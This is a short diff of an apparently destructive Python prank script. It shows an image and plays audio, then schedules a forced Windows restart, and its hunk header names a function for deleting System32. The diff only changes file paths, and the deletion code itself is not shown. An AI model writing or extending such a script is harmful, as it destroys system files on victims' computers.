@@ -21,13 +21,13 @@ def borrar_system32():
 
 def mostrar_imagen_y_reproducir_audio():
     # Mostrar imagen
-    imagen = tk.PhotoImage(file="./Jord_Wild_selfie.jpg")
+    imagen = tk.PhotoImage(file=r".\Jord_Wild_selfie.jpg")
     label_imagen = tk.Label(root, image=imagen)
     label_imagen.pack()
 
     # Reproducir audio
     pygame.mixer.init()
-    pygame.mixer.music.load("./audo_XD_jordi_wild.mp3")
+    pygame.mixer.music.load(r".\audo_XD_jordi_wild.mp3")
     pygame.mixer.music.play()
 
     root.after(10000, reiniciar_windows)  # Reiniciar Windows después de 10 segundos
